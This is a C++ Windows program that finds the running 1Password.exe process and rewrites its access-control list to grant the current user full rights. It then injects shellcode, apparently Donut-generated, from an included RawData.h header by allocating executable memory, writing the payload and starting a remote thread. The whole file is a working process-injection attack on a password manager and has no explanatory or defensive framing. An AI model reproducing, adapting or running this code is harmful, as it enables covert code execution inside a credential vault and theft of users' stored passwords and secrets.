#define SECURITY_WIN32

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <AclAPI.h>
#include <security.h>
#include "RawData.h"

int main()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    HANDLE hProcess = NULL, hProc = NULL;
    PSID* ppsidOwner = (PSID*)malloc(sizeof(PSID)), * ppsidGroup = (PSID*)malloc(sizeof(PSID));
    PACL* ppDacl = (PACL*)malloc(sizeof(PACL)), * ppSacl = (PACL*)malloc(sizeof(PACL));
    PSECURITY_DESCRIPTOR* ppSecurityDescriptor = (PSECURITY_DESCRIPTOR*)malloc(sizeof(PSECURITY_DESCRIPTOR));
    DWORD dwRet;
    ACCESS_MASK permissions = STANDARD_RIGHTS_ALL | GENERIC_ALL;
    DWORD sz = sizeof(wchar_t) * MAX_PATH;
    DWORD mp = MAX_PATH;
    wchar_t* username = (wchar_t*)malloc(sz);
    ZeroMemory(username, sz);
    PACL new_dacl = nullptr;
    DWORD lastError = 0;
    void* pDonutSc = nullptr;
    HANDLE hThread = NULL;
    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (lstrcmpW(entry.szExeFile, L"1Password.exe") == 0)
            {
                hProcess = OpenProcess(WRITE_DAC | PROCESS_QUERY_LIMITED_INFORMATION | READ_CONTROL, FALSE, entry.th32ProcessID);

                dwRet = GetSecurityInfo(
                    hProcess,
                    SE_KERNEL_OBJECT,
                    DACL_SECURITY_INFORMATION,
                    ppsidOwner,
                    ppsidGroup,
                    ppDacl,
                    ppSacl,
                    ppSecurityDescriptor
                );
                if (dwRet == ERROR_SUCCESS)
                {
                    GetUserNameEx(NameSamCompatible, username, &mp);
                    EXPLICIT_ACCESS access = {};
                    access.grfAccessPermissions = permissions;
                    access.grfAccessMode = GRANT_ACCESS;
                    access.grfInheritance = NO_INHERITANCE;
                    access.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
                    access.Trustee.ptstrName = username;


                    dwRet = SetEntriesInAcl(1, &access, *ppDacl, &new_dacl);
                    if (dwRet != ERROR_SUCCESS)
                    {
                        lastError = GetLastError();
                        goto cleanup;
                    }
                    dwRet = SetSecurityInfo(
                        hProcess,
                        SE_KERNEL_OBJECT,
                        DACL_SECURITY_INFORMATION,
                        NULL,
                        NULL,
                        new_dacl,
                        NULL
                    );
                    if (dwRet != ERROR_SUCCESS)
                    {
                        lastError = GetLastError();
                        goto cleanup;
                    }
                    hProc = OpenProcess(PROCESS_ALL_ACCESS, false, entry.th32ProcessID);
                    if (hProc == NULL) {
                        lastError = GetLastError();
                        goto cleanup;
                    }
                    pDonutSc = VirtualAllocEx(hProc, NULL, sizeof(rawData), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    DWORD bytesWritten = 0;
                    if (WriteProcessMemory(hProc, pDonutSc, rawData, sizeof(rawData), &bytesWritten) && bytesWritten == sizeof(rawData))
                    {
                        hThread = CreateRemoteThreadEx(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pDonutSc, NULL, 0, NULL, NULL);
                        if (hThread == NULL) {
                            lastError = GetLastError();
                            goto cleanup;
                        }
                    }
                }

                // Do stuff..
                CloseHandle(hProcess);
                hProcess = NULL;
            }
        }
    }
cleanup:

    if (snapshot != NULL)
        CloseHandle(snapshot);
    if (hProcess != NULL)
        CloseHandle(hProcess);
    if (hProc != NULL)
        CloseHandle(hProc);
    if (username != nullptr)
        free(username);
    if (new_dacl != nullptr)
        LocalFree(new_dacl);
    if (hThread != NULL)
        CloseHandle(hThread);
    if (ppsidGroup != nullptr)
        free(ppsidGroup);
    if (ppsidOwner != nullptr)
        free(ppsidOwner);
    if (ppDacl != nullptr)
        free(ppDacl);
    if (ppSacl != nullptr)
        free(ppSacl);
    if (ppSecurityDescriptor != nullptr)
        free(ppSecurityDescriptor);
    return lastError;
}